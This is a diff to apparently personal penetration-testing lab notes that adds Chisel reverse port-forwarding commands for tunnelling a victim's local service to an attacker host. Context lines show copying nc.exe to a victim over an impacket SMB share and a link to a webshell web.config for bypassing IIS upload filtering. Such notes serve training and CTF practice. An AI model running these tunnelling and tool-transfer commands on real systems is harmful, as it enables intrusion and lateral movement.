@@ -257,6 +257,18 @@ Password Protected SSH Private Key:
 	- impacket
 		- Start SMB server: impacket-smbserver smb Downloads/ 
 		- On victim: copy \\10.10.16.12\smb\nc.exe
+	
+	Port forwarding with Chisel
+		- Problem: The target service is running locally on the victim at port 8888. We want port to forward that 8888 connection to the attacker at 8080. 
+		- Solution 
+			- Attacker: 
+				- Download chisel linux 386 
+				- chmod 777 chisel  
+				- ./chisel server --reverse
+			- Victim: 
+				- Download chisel win 386 
+				- chisel.exe client 10.10.16.18:8080 R:8888:127.0.0.1:8888								
+
 		
 	- Bypassing shell uplaod filtering on IIS
 		- Upload web.config to victim: https://raw.githubusercontent.com/tennc/webshell/master/aspx/web.config
